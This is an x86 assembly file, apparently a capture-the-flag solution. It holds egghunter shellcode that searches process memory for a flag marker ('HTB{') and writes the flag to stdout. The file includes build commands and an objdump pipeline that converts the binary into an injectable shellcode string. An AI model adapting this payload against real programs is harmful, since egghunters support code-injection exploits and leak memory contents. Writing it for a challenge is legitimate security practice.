; credit to Shakugan for the help.
; slightly adjusted, I added 'xor eax, eax', eax would go from [0xffffffea] to 
; [0xffffff21] instead of [0x21] for access() syscall, leading to a crash.
; Didn't use alarm() syscall, it works for me without it local & remote.

; nasm -f elf32 -o x3.o x3.s
; ld -m elf_i386 -s -o x3 x3.o
; objdump -d ./x3|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $/'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

global _start

section .text

_start:
  mov edx, 0        	     ; set start address to search for the egg         

next_page:
  or dx, 0xfff            ; dx=4095 ; 0x1000 - 1 (4095) ; Page sizes in Linux x86 = 4096

next_address:
  inc edx                 ; edx = 4096
  pusha                   ; push all of the current general purposes registers onto the stack
  xor ecx, ecx            ; clear arg2
  lea ebx, [edx + 0x4]    ; address to be validated for memory violation
  xor eax, eax
  mov al, 0x21		  ; 33
  int 0x80		  ; SYSCALL access()

valid_address_check:
  cmp al, 0xf2            ; compare return value, bad address = EFAULT (0xf2)
  popa                    ; get all the registers back
  jz next_page            ; jump to next page if EFAULT occurs

egg_vs_memaddr:
  mov edi, dword 0x7b425448 
  cmp [edx], edi          ; compare string to egg
  jnz next_address        ; jump to next address if NOT egg

read_egg_location:	  ; SHELLCODE LOCATION
  mov ecx, edx            ; assign address of flag (buffer) to arg2 of write()
  push 0x24               ; set length of flag to write = 0x24(36) at arg3
  pop edx
  push 0x1                ; set arg1 (fd) as 1 in write() which is stdout
  pop ebx
  push 0x4
  pop eax		  ; write systemcall
  int 0x80

